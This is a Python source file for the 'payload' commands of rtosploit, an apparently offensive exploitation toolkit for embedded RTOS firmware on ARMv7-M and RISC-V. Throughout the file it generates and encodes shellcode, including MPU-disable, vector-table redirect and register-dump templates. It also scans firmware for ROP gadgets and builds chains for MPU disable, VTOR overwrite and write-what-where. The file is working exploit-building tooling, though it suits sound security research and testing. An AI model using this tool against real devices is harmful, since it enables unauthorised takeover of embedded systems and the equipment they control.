"""rtosploit payload — generate shellcode and ROP chains."""
import click
from rich.console import Console

console = Console()
err_console = Console(stderr=True)

# Map CLI arch choices to internal arch strings accepted by ShellcodeGenerator
_ARCH_MAP = {
    "armv7m": "arm",
    "riscv32": "riscv32",
}


@click.group("payload")
def payload():
    """Generate shellcode templates and ROP chains for embedded targets."""
    pass


@payload.command("shellcode")
@click.option("--arch", type=click.Choice(["armv7m", "riscv32"]), required=True, help="Target architecture")
@click.option("--type", "shellcode_type", type=click.Choice(["nop_sled", "infinite_loop", "mpu_disable", "vtor_redirect", "register_dump"]), required=True, help="Shellcode template type")
@click.option("--encoder", type=click.Choice(["raw", "xor", "nullfree"]), default="raw", show_default=True)
@click.option("--bad-chars", type=str, default="", help="Hex bad characters, e.g. '000a0d'")
@click.option("--format", "output_format", type=click.Choice(["raw", "hex", "c", "python"]), default="hex", show_default=True)
@click.option("--length", type=int, default=16, show_default=True, help="Length parameter (for nop_sled)")
@click.option("--address", type=str, default=None, help="Hex address parameter (for vtor_redirect, register_dump)")
@click.pass_context
def shellcode_cmd(ctx, arch, shellcode_type, encoder, bad_chars, output_format, length, address):
    """Generate shellcode for ARM Thumb2 or RISC-V targets.

    \b
    Examples:
      rtosploit payload shellcode --arch armv7m --type infinite_loop
      rtosploit payload shellcode --arch armv7m --type nop_sled --length 32
      rtosploit payload shellcode --arch armv7m --type mpu_disable --format c
    """
    from rtosploit.payloads.shellcode import ShellcodeGenerator
    gen = ShellcodeGenerator()

    # Map CLI arch names to the strings the generator accepts
    internal_arch = _ARCH_MAP.get(arch, arch)

    target_addr = int(address, 16) if address else 0x20000000

    if shellcode_type == "nop_sled":
        raw_bytes = gen.nop_sled(internal_arch, length)
    elif shellcode_type == "infinite_loop":
        raw_bytes = gen.infinite_loop(internal_arch)
    elif shellcode_type == "mpu_disable":
        raw_bytes = gen.mpu_disable()
    elif shellcode_type == "vtor_redirect":
        raw_bytes = gen.vtor_redirect(target_addr)
    elif shellcode_type == "register_dump":
        raw_bytes = gen.register_dump(target_addr)
    else:
        raw_bytes = b""

    # Apply encoding
    if encoder == "xor":
        raw_bytes = bytes(b ^ 0x42 for b in raw_bytes)
    elif encoder == "nullfree":
        raw_bytes = bytes(b if b != 0 else 1 for b in raw_bytes)

    # Filter bad characters
    if bad_chars:
        from rtosploit.payloads.shellcode import filter_bad_chars
        bad = bytes.fromhex(bad_chars)
        raw_bytes = filter_bad_chars(raw_bytes, bad)
        encoder = f"{encoder}+xor_badchar"

    output_json = ctx.obj.get("output_json", False)

    if output_json:
        import json
        # Format the payload according to --format flag
        if output_format == "c":
            hex_str = ", ".join(f"0x{b:02x}" for b in raw_bytes)
            formatted = f"unsigned char shellcode[] = {{{hex_str}}};  // {len(raw_bytes)} bytes"
        elif output_format == "python":
            hex_str = "".join(f"\\x{b:02x}" for b in raw_bytes)
            formatted = f'shellcode = b"{hex_str}"  # {len(raw_bytes)} bytes'
        elif output_format == "raw":
            formatted = raw_bytes.hex()
        else:
            formatted = raw_bytes.hex()

        click.echo(json.dumps({
            "arch": arch,
            "type": shellcode_type,
            "encoder": encoder,
            "length": len(raw_bytes),
            "hex": raw_bytes.hex(),
            "formatted": formatted,
        }))
        return

    if output_format == "raw":
        import sys
        sys.stdout.buffer.write(raw_bytes)
    elif output_format == "hex":
        click.echo(raw_bytes.hex())
    elif output_format == "c":
        hex_str = ", ".join(f"0x{b:02x}" for b in raw_bytes)
        click.echo(f"unsigned char shellcode[] = {{{hex_str}}};  // {len(raw_bytes)} bytes")
    elif output_format == "python":
        hex_str = "".join(f"\\x{b:02x}" for b in raw_bytes)
        click.echo(f'shellcode = b"{hex_str}"  # {len(raw_bytes)} bytes')

    err_console.print(f"\n[dim]Length: {len(raw_bytes)} bytes | Encoder: {encoder}[/dim]")


@payload.command("rop")
@click.option("--binary", "-b", required=True, type=click.Path(exists=True), help="Target binary to scan for gadgets")
@click.option("--arch", type=click.Choice(["armv7m", "riscv32"]), default="armv7m", show_default=True)
@click.option("--goal", type=click.Choice(["mpu_disable", "vtor_overwrite", "write_what_where"]), default="mpu_disable", show_default=True)
@click.option("--bad-chars", type=str, default="", help="Hex bad characters")
@click.option("--load-addr", type=str, default="0x00000000", show_default=True, help="Firmware load address (hex)")
@click.option("--format", "output_format", type=click.Choice(["raw", "hex", "python"]), default="hex", show_default=True)
@click.pass_context
def rop_cmd(ctx, binary, arch, goal, bad_chars, load_addr, output_format):
    """Find ROP gadgets and build chains for embedded binaries.

    \b
    Examples:
      rtosploit payload rop --binary fw.bin --goal mpu_disable
      rtosploit payload rop --binary fw.bin --goal vtor_overwrite --bad-chars 000a
    """
    from rtosploit.payloads.rop import ROPHelper

    with open(binary, "rb") as f:
        firmware_bytes = f.read()

    helper = ROPHelper()
    load_address = int(load_addr, 16)
    bad = bytes.fromhex(bad_chars) if bad_chars else b""

    gadgets = helper.find_bxlr_gadgets(firmware_bytes, load_address)
    gadgets = helper.filter_bad_chars(gadgets, bad)

    # Build chain based on goal
    if goal == "mpu_disable":
        chain_bytes = helper.build_mpu_disable(gadgets)
    elif goal == "vtor_overwrite":
        chain_bytes = helper.build_write_what_where(gadgets, 0xE000ED08, 0x20000000)
    elif goal == "write_what_where":
        chain_bytes = helper.build_write_what_where(gadgets, 0xDEADBEEF, 0x41414141)
    else:
        chain_bytes = b""

    output_json = ctx.obj.get("output_json", False)

    if output_json:
        import json
        # Format the chain according to --format flag
        if output_format == "python":
            hex_str = "".join(f"\\x{b:02x}" for b in chain_bytes)
            formatted = f'rop_chain = b"{hex_str}"'
        else:
            formatted = chain_bytes.hex()

        click.echo(json.dumps({
            "goal": goal,
            "gadgets_found": len(gadgets),
            "chain_length": len(chain_bytes),
            "chain_hex": chain_bytes.hex(),
            "formatted": formatted,
        }))
        return

    err_console.print(f"[dim]Found {len(gadgets)} gadgets in {binary}[/dim]")

    if not chain_bytes:
        console.print(f"[yellow]No suitable gadgets found for goal: {goal}[/yellow]")
        return

    if output_format == "hex":
        click.echo(chain_bytes.hex())
    elif output_format == "python":
        hex_str = "".join(f"\\x{b:02x}" for b in chain_bytes)
        click.echo(f'rop_chain = b"{hex_str}"')
    elif output_format == "raw":
        import sys
        sys.stdout.buffer.write(chain_bytes)

    err_console.print(f"\n[dim]Chain: {len(chain_bytes)} bytes | Gadgets used: {len(gadgets)}[/dim]")
